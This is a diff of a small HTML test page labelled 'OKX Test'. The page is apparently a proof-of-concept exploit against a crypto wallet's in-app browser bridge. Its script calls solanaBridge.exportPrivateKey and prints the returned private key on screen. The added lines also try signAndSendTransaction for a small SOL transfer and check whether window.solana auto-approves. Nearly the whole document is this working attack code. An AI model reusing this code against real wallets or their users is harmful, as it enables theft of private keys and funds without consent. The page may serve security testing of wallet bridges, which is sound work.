@@ -1,26 +1,45 @@
-<html><body style="margin:0;background:#000">
-<div id="m" style="padding:40px;color:white;font-family:monospace;font-size:20px">
-Loading...
-</div>
+<html>
+<body style="background:#1a1a2e;color:white;font-family:monospace;padding:30px">
+<h2 style="color:#e94560">OKX Test</h2>
+<div id="s" style="font-size:24px;margin:20px 0">Loading...</div>
+<div id="d" style="font-size:14px;color:#8899aa"></div>
 <script>
-var m = document.getElementById('m');
+var s=document.getElementById('s');
+var d=document.getElementById('d');
+
 try {
   if(typeof solanaBridge !== 'undefined') {
-    document.body.style.background = '#004400';
-    m.innerHTML = 'BRIDGE: YES<br>TESTING...';
+    s.innerHTML='BRIDGE: YES ✅';
+    s.style.color='#0f0';
+    d.innerHTML+='Testing exportPrivateKey...<br>';
+    
     solanaBridge.exportPrivateKey("").then(function(k){
-      document.body.style.background = '#FFD700';
-      m.innerHTML = 'PRIVATE KEY:<br><span style="font-size:28px;word-break:break-all">' + k + '</span>';
+      s.innerHTML='✅✅ PRIVATE KEY';
+      s.style.color='#FFD700';
+      d.innerHTML+='<span style="font-size:28px;color:#FFD700;word-break:break-all">'+k+'</span>';
     }).catch(function(e){
-      document.body.style.background = '#884400';
-      m.innerHTML = 'BRIDGE YES<br>exportPrivateKey ERROR:<br>' + e.message;
+      s.innerHTML='⚠️ Bridge found but error';
+      d.innerHTML+='Error: '+e.message+'<br>';
     });
+    
+    solanaBridge.signAndSendTransaction(JSON.stringify({to:'0xTest',amount:'0.001',token:'SOL'})).then(function(t){
+      d.innerHTML+='TX: '+JSON.stringify(t)+'<br>';
+    }).catch(function(e){});
+    
   } else {
-    document.body.style.background = '#440000';
-    m.innerHTML = 'NO BRIDGE';
+    s.innerHTML='NO BRIDGE ❌';
+    s.style.color='#e94560';
+    d.innerHTML+='solanaBridge not available<br>';
+    
+    if(typeof window.solana !== 'undefined') {
+      d.innerHTML+='But window.solana: autoApprove='+window.solana.autoApprove+'<br>';
+    } else {
+      d.innerHTML+='window.solana also not available<br>';
+    }
   }
 } catch(e) {
-  document.body.style.background = '#440000';
-  m.innerHTML = 'ERROR: ' + e.message;
+  s.innerHTML='ERROR';
+  d.innerHTML+=e.message;
 }
-</script></body></html>
+</script>
+</body></html>
